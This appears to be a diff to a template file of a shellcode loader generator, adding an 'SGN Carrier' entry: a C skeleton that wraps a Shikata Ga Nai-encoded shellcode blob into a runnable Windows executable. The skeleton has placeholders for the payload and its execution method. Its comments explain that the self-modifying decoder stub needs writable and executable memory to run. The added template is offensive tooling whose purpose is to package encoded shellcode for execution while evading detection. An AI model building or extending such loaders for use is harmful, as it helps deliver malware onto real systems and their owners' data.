@@ -1380,3 +1380,29 @@ templates:
   - name: SHELLCODE_EXECUTION
     kind: snippet
     snippetTemplate: shellcodeexecution
+- id: sgncarrier
+  display: SGN Carrier
+  description: Minimal carrier that wraps an SGN-encoded .bin into a runnable executable. Reuses the selected shellcode execution method.
+  content: |
+    // SGN carrier - wraps a Shikata Ga Nai-encoded blob into a runnable PE.
+    // The SGN decoder stub is self-modifying and requires writable+executable
+    // memory at execution; the chosen execution snippet must allocate RWX
+    // (or perform RW->RWX, not RW->RX) for the decoder to run correctly.
+    #define WIN32_LEAN_AND_MEAN
+    #include <windows.h>
+    #include <winternl.h>
+
+    INT main(VOID)
+    {
+        {{SHELLCODE_SOURCE}}
+
+        {{SHELLCODE_EXECUTION}}
+
+        return 0;
+    }
+  placeholders:
+  - name: SHELLCODE_SOURCE
+    kind: system
+  - name: SHELLCODE_EXECUTION
+    kind: snippet
+    snippetTemplate: shellcodeexecution
